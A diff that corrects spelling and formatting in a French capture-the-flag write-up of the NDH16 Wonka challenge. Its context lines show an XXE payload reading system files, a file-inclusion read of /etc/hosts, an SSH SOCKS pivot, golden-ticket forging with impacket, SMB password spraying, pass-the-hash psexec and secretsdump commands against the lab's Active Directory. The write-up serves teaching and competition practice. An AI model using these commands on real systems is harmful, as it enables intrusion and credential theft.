@@ -25,7 +25,7 @@ On va sur le site de willywonka.shop
 
 ![willywonka shop](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag1/shop.png)
 
-En parcourant le site, on se rend compte que la seule page intéressante est la page d'upload, les autres étant des pages HTML classiques sans informations.
+En parcourant le site, on se rend compte que la seule page intéressante est la page d'upload, les autres étant des pages HTML classiques sans informations (extension .html et .php pour la page d'upload).
 
 ![interface d'upload](https://github.com/Sacriyana/CTF-Write-Up/raw/master/ndh16_wonkachallenge/flag1/upload_example.png)
 
@@ -68,9 +68,9 @@ Voici le MANIFEST.xml avec la XXE :
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 ]>
 <root>
-	<entreprise>&xxe;</entreprise>
-	<prixBTC>xxx BTC</prixBTC>
-	<adresseBTC>xxx</adresseBTC>
+    <entreprise>&xxe;</entreprise>
+    <prixBTC>xxx BTC</prixBTC>
+    <adresseBTC>xxx</adresseBTC>
 </root>
 ```
 
@@ -123,7 +123,7 @@ On va donc lire le fichier /flag.txt
 
 Payload : 
 
-`php://filter/convert.base64-encode/resource=/flag.xml`
+`php://filter/convert.base64-encode/resource=/flag.txt`
 
 C'est immédiat :
 
@@ -160,7 +160,7 @@ Et voilà le flag de cette étape : `@llez_le$_BLEU$!!!`
 
 ## Infiltrer Pramafil en compromettant son Active Directory (flag 3)
 
-A partir de cette étape, nous devons infiltrer le réseau interne de pramacorp. Pour ce faire, il y a plusieurs étapes. La premiére sera de récupérer un maximum de droits sur le domaine pramafil.corp (flag 3) puis ensuite compromettre le sous-domaine dev.pramacorp.fr (flag 4) pour enfin attaquer le domaine maitre pramacorp.fr (notre cible final, flag 5).
+A partir de cette étape, nous devons infiltrer le réseau interne de pramacorp. Pour ce faire, il y a plusieurs étapes. La première sera de récupérer un maximum de droits sur le domaine pramafil.corp (flag 3) puis ensuite compromettre le sous-domaine dev.pramacorp.fr (flag 4) pour enfin attaquer le domaine maitre pramacorp.fr (notre cible finale, flag 5).
 
 Bon, un check des informations récupérées s'impose.  
 On possède un moyen sur les deux domaines pour récupérer des informations.  
@@ -299,18 +299,18 @@ Cependant, ce n'est pas perdu. On peut quand même utiliser ce serveur comme ser
 ssh -D 9050 -N dev1@151.80.230.58 -i dev1.priv
 ```
 
-#### Qu'est-ce qu'il y a au bout du tunnel ?
+### Qu'est-ce qu'il y a au bout du tunnel ?
 
 On a créé un serveur de rebonds, mais pour aller où ? C'est une très bonne question. Étant donné que le serveur de pramafil est utilisé par des développeurs, ils ont du modifier le /etc/hosts pour faciliter les connexions avec des serveurs en interne. Une vérification du fichier hosts s'impose donc.
 
 * http://pramafil.com/cgu/?v=/etc/hosts
 
 ```
-127.0.0.1	localhost 
-127.0.1.1	www.pramafil.com	    www
-10.10.0.207	preprod.pramafil.com	preprod 
-10.10.0.202	dcfil.pramafil.corp  	pramafil.corp 
-10.10.0.203	ad.dev.pramacorp.fr 	dev.pramacorp.fr 
+127.0.0.1   localhost 
+127.0.1.1   www.pramafil.com        www
+10.10.0.207 preprod.pramafil.com    preprod 
+10.10.0.202 dcfil.pramafil.corp     pramafil.corp 
+10.10.0.203 ad.dev.pramacorp.fr     dev.pramacorp.fr 
 
 # The following lines are desirable for IPv6 capable hosts 
 ::1 localhost ip6-localhost ip6-loopback 
@@ -320,14 +320,14 @@ ff02::2 ip6-allrouters
 
 On a maintenant les IP internes de l'entreprise Pramacorp.
 
-#### À la recherche du ticket d'or perdu
+### À la recherche du ticket d'or perdu
 
 Bien joli tout ça, mais il nous manque quelque chose d'essentiel, un moyen d'usurper une identité sur l'active directory.  
 En se rappelant l'énoncé, on sait qu'un ticket kerberos de pramafil.corp est à vendre sur willywonka.shop:4242.  
 Les tickets sont donc stockés quelques part. Mais où ? À nous de le découvrir.  
 
 On tente un upload d'un nouveau ticket sur le shop. On fait bien attention aux pages liés à cette manipulation, notamment les commentaires.
-Le développeur du shop a souhaité renseigner le vendeur du ticket do'ù il était stocké dans les commentaires de la page une fois l'upload terminé.
+Le développeur du shop a souhaité renseigner le vendeur du ticket d'où il était stocké dans les commentaires de la page une fois l'upload terminé.
 
 ```
 <!-- first need admin validation -->
@@ -367,12 +367,12 @@ Ce qui nous donne le manifest suivant :
 </root>
 ```
 
-Chance pour nous, le manifest contient toutes les infos nécessaires pour créer un ticket d'or ! À nous la visite du domaine de Pramafil.corp
+Chance pour nous, le manifest contient toutes les infos nécessaires pour créer un ticket d'or ! À nous la visite du domaine de Pramafil.corp.
 Il est aussi possible de récupérer le ticket.kirbi pour le rejouer directement.
 
 ### Création du ticket d'or 
 
-Pour cette étape, j'ai utiliser ticketer (dispo sous [impacket](https://github.com/CoreSecurity/impacket), je conseille l'utilisation d'un virtualenv), mais vous pouvez aussi utiliser Mimikatz avec Kékéo pour la conversion du `kirbi` en `ccache`.
+Pour cette étape, j'ai utilisé ticketer (dispo sous [impacket](https://github.com/CoreSecurity/impacket), je conseille l'utilisation d'un virtualenv), mais vous pouvez aussi utiliser Mimikatz avec Kékéo pour la conversion du `kirbi` en `ccache`.
 
 ```
 impacket/examples/ticketer.py -nthash 4d5e0617720ee5eaf21830fd8d8f75ea -domain-sid S-1-5-21-1541817219-3195100404-4088832866 -domain PRAMAFIL Administrator
@@ -396,7 +396,7 @@ Et voilà, on a un ticket d'or tout ce qu'il y a de plus valide.
 
 ### Proxychains et un peu de configuration
 
-Pour utiliser le proxy SOCKS créé précédemment, on va utiliser [proxychains](https://github.com/haad/proxychains). Certains préférons utiliser des solutions comme [Redsocks](https://github.com/darkk/redsocks). 
+Pour utiliser le proxy SOCKS créé précédemment, on va utiliser [proxychains](https://github.com/haad/proxychains) avec sa configuration par défaut à un détail près. Certains préfèrons utiliser des solutions comme [Redsocks](https://github.com/darkk/redsocks). 
 
 **Avec proxychains pensez à bien supprimer le proxydns dans /etc/proxychains.conf si vous avez des comportements étranges.**
 
@@ -504,11 +504,11 @@ Et voilà le flag de cette étape : 568ec725---------------f30e38eec
 
 ## Infiltration de la société mère par son sous-domaine (flag 4)
 
-Pour rappel, nous devons infiltrer le réseau interne de pramacorp. Pour ce faire, il y a plusieurs étapes. La premiére sera de récupérer un maximum de droits sur le domaine pramafil.corp (flag 3) puis ensuite compromettre le sous-domaine dev.pramacorp.fr (flag 4) pour enfin attaquer le domaine maitre pramacorp.fr (notre cible final, flag 5).
+Pour rappel, nous devons infiltrer le réseau interne de pramacorp. Pour ce faire, il y a plusieurs étapes. La première sera de récupérer un maximum de droits sur le domaine pramafil.corp (flag 3) puis ensuite compromettre le sous-domaine dev.pramacorp.fr (flag 4) pour enfin attaquer le domaine maitre pramacorp.fr (notre cible finale, flag 5).
 
 Pour cette étape, j'ai principalement utilisé Metasploit et Empire.  
 
-Nous venons de rooter un premier domaine. Nous devons root dev.pramacorp.fr
+Nous venons de rooter un premier domaine. Nous devons rooter dev.pramacorp.fr.
 Pour commencer, utilisons les couples login/password que l'on a récupéré du 1er domaine sur le 2iéme en utilisant la faille la plus connue de tous, la réutilisation de mot de passe par les utilisateurs.  
 Commençons par transformer les hashs récupérés en identifiants DB pour msf. 
 
@@ -550,7 +550,7 @@ msf auxiliary(scanner/smb/smb_login) > run
 Et hop, il est bien là. Vous savez l'utilisateur qui va utiliser un mot de passe identique pour tous ces services.
 Le nom gagnant est BITION.  
 
-On va donc ce servir de ce user pour se connecter sur l'ad.dev.pramacorp.fr
+On va donc se servir de ce user pour se connecter sur l'ad.dev.pramacorp.fr
 
 ```
 proxychains impacket/examples/psexec.py BITION@ad.dev.pramacorp.fr -hashes aad3b435b51404eeaad3b435b51404ee:27cbe43b98013e6e7a5c16fc484b4b6a
@@ -794,7 +794,7 @@ Et voilà le flag de cette étape : e65b41757ea496c2c60e82c05ba8b373.
 
 ## L'histoire d'un ticket (flag 5)
 
-Pour rappel, nous devons infiltrer le réseau interne de pramacorp. Pour ce faire, il y a plusieurs étapes. La premiére sera de récupérer un maximum de droits sur le domaine pramafil.corp (flag 3) puis ensuite compromettre le sous-domaine dev.pramacorp.fr (flag 4) pour enfin attaquer le domaine maitre pramacorp.fr (notre cible final, flag 5).
+Pour rappel, nous devons infiltrer le réseau interne de pramacorp. Pour ce faire, il y a plusieurs étapes. La première sera de récupérer un maximum de droits sur le domaine pramafil.corp (flag 3) puis ensuite compromettre le sous-domaine dev.pramacorp.fr (flag 4) pour enfin attaquer le domaine maitre pramacorp.fr (notre cible finale, flag 5).
 
 On a le krbtgt du sous-domaine ad.pramacorp.fr, son SID en gros tout ce qu'il faut pour créer un ticket d'or.  
 Avec Windows, il existe le SID History qui permet à un utilisateur de changer de domaine en conservant les droits sur son ancien domaine.
@@ -859,7 +859,7 @@ Et voilà le flag de cette étape : 5a3a5e76a7f4ef645fc82118ab87b56c.
 
 ## Heureseument que les navigateurs sont là pour nous faciliter la vie (flag 6)
 
-Nous avonc compromis le domaine pramacorp.fr. Pour la suite de l'épreuve, nous devons allumer un écran (flag 7) mais avant tout récupérons un accés à la machine du développeur pour avoir un accé à une application qui nous donnera accés à l'écran.
+Nous avonc compromis le domaine pramacorp.fr. Pour la suite de l'épreuve, nous devons allumer un écran (flag 7) mais avant tout récupérons un accès à la machine du développeur pour avoir un accès à une application qui nous donnera accès à l'écran.
 
 ### Un peu d'inventaire
 
@@ -915,7 +915,7 @@ Hostname                                                     OpenPorts
 10.10.0.202                                                  445,139,53,135,49154,88
 ```
 
-On va ensuite lister les utilitsateurs du domaine pramacorp.fr.
+On va ensuite lister les utilisateurs du domaine pramacorp.fr.
 
 ```
 proxychains impacket/examples/secretsdump.py -use-vss Administrator@ad.dev.pramacorp.fr -k -no-pass
